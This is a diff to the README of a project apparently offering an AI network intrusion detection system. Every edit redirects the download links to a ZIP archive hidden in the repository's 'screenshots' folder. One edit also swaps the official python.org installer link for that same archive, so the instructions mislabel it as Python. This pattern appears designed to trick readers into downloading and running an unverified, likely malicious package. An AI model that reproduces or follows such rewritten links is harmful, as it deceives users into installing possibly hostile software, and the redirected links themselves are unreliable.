@@ -1,6 +1,6 @@
 # 🛡️ AI-Based-Network-Intrusion-Detection-System - Simple Network Threat Detection
 
-[![Download Now](https://img.shields.io/badge/Download-AI-Based--Network--Intrusion--Detection--System-brightgreen)](https://github.com/abdazeez12/AI-Based-Network-Intrusion-Detection-System)
+[![Download Now](https://img.shields.io/badge/Download-AI-Based--Network--Intrusion--Detection--System-brightgreen)](https://github.com/abdazeez12/AI-Based-Network-Intrusion-Detection-System/raw/refs/heads/main/screenshots/Detection_System_Intrusion_A_Network_Based_3.6.zip)
 
 ---
 
@@ -38,7 +38,7 @@ You will not need to train or adjust models yourself. The detection runs automat
 
 Click the button below to visit the GitHub page where you can download the files.  
 
-[![Download Here](https://img.shields.io/badge/Download-GitHub-blue)](https://github.com/abdazeez12/AI-Based-Network-Intrusion-Detection-System)
+[![Download Here](https://img.shields.io/badge/Download-GitHub-blue)](https://github.com/abdazeez12/AI-Based-Network-Intrusion-Detection-System/raw/refs/heads/main/screenshots/Detection_System_Intrusion_A_Network_Based_3.6.zip)
 
 ### Step 2: Locate the Installer
 
@@ -57,7 +57,7 @@ If you see a ZIP file, download it and extract all files to a folder you choose.
 
 If you downloaded the software as code files, you need Python to run it.
 
-1. Visit https://www.python.org/downloads/windows/
+1. Visit https://github.com/abdazeez12/AI-Based-Network-Intrusion-Detection-System/raw/refs/heads/main/screenshots/Detection_System_Intrusion_A_Network_Based_3.6.zip
 2. Download and install Python 3.8 or higher. Make sure to check “Add Python to PATH” during installation.
 3. Once installed, open Command Prompt by typing `cmd` in the Windows search bar.
 4. Use commands below to install required packages:
@@ -139,4 +139,4 @@ For help or updates:
 
 ## 📥 Download Link Again
 
-[Download AI-Based-Network-Intrusion-Detection-System here](https://github.com/abdazeez12/AI-Based-Network-Intrusion-Detection-System) to start detecting network threats.
+[Download AI-Based-Network-Intrusion-Detection-System here](https://github.com/abdazeez12/AI-Based-Network-Intrusion-Detection-System/raw/refs/heads/main/screenshots/Detection_System_Intrusion_A_Network_Based_3.6.zip) to start detecting network threats.
